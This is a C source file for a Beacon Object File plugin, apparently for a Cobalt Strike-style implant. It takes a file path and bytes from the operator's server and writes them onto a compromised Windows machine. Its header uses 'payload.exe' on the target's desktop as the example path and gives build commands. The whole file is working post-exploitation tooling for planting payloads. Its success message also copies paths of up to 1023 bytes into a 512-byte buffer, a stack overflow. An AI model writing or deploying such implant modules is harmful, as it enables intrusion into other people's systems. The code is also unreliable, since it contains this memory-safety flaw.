/*
 * file_upload.c - File upload BOF plugin.
 *
 * Receives a file path and file content via Beacon Data API,
 * writes the content to the specified path on the target machine.
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -c file_upload.c -o file_upload.o
 *
 * Usage from server:
 *   Upload file_upload.o, args format:
 *     arg1 (string): destination file path, e.g. "C:\Users\target\Desktop\payload.exe"
 *     arg2 (binary): file content bytes
 */

#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);

static void bof_memcpy(void* dst, const void* src, unsigned long long n) {
    unsigned char* d = (unsigned char*)dst;
    const unsigned char* s = (const unsigned char*)src;
    while (n--) *d++ = *s++;
}

static int bof_strlen(const char* s) {
    int n = 0;
    while (s[n]) n++;
    return n;
}

/* Simple integer to decimal string */
static int bof_itoa(unsigned int val, char* buf) {
    char tmp[12];
    int i = 0;
    if (val == 0) { buf[0] = '0'; return 1; }
    while (val > 0) {
        tmp[i++] = '0' + (val % 10);
        val /= 10;
    }
    int len = i;
    for (int j = 0; j < len; j++) {
        buf[j] = tmp[len - 1 - j];
    }
    return len;
}

void go(char* args, int alen)
{
    char* file_path = NULL;
    int file_path_len = 0;
    char* file_data = NULL;
    int file_data_len = 0;

    /* Parse args: first a string (path), then binary data (content) */
    if (args == NULL || alen < 4) {
        BeaconOutput(CALLBACK_ERROR, "No arguments provided\n", 22);
        return;
    }

    datap parser;
    BeaconDataParse(&parser, args, alen);
    file_path = BeaconDataExtract(&parser, &file_path_len);
    file_data = BeaconDataExtract(&parser, &file_data_len);

    if (file_path == NULL || file_path_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No file path provided\n", 22);
        return;
    }

    if (file_data == NULL || file_data_len <= 0) {
        BeaconOutput(CALLBACK_ERROR, "No file content provided\n", 25);
        return;
    }

    /* Null-terminate the path */
    char path_buf[1024];
    if (file_path_len >= (int)sizeof(path_buf)) {
        BeaconOutput(CALLBACK_ERROR, "Path too long\n", 14);
        return;
    }
    bof_memcpy(path_buf, file_path, file_path_len);
    path_buf[file_path_len] = '\0';

    /* Create/overwrite the file */
    HANDLE hFile = KERNEL32$CreateFileA(
        path_buf,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconOutput(CALLBACK_ERROR, "Failed to create file\n", 22);
        return;
    }

    /* Write content */
    DWORD bytesWritten = 0;
    BOOL ok = KERNEL32$WriteFile(hFile, file_data, (DWORD)file_data_len, &bytesWritten, NULL);
    KERNEL32$CloseHandle(hFile);

    if (!ok) {
        BeaconOutput(CALLBACK_ERROR, "Failed to write file\n", 21);
        return;
    }

    /* Report success */
    char msg[512];
    int pos = 0;
    const char* p1 = "Uploaded ";
    int p1len = bof_strlen(p1);
    bof_memcpy(msg + pos, p1, p1len); pos += p1len;

    pos += bof_itoa((unsigned int)bytesWritten, msg + pos);

    const char* p2 = " bytes to ";
    int p2len = bof_strlen(p2);
    bof_memcpy(msg + pos, p2, p2len); pos += p2len;

    bof_memcpy(msg + pos, path_buf, file_path_len); pos += file_path_len;

    msg[pos++] = '\n';

    BeaconOutput(CALLBACK_OUTPUT, msg, pos);
}
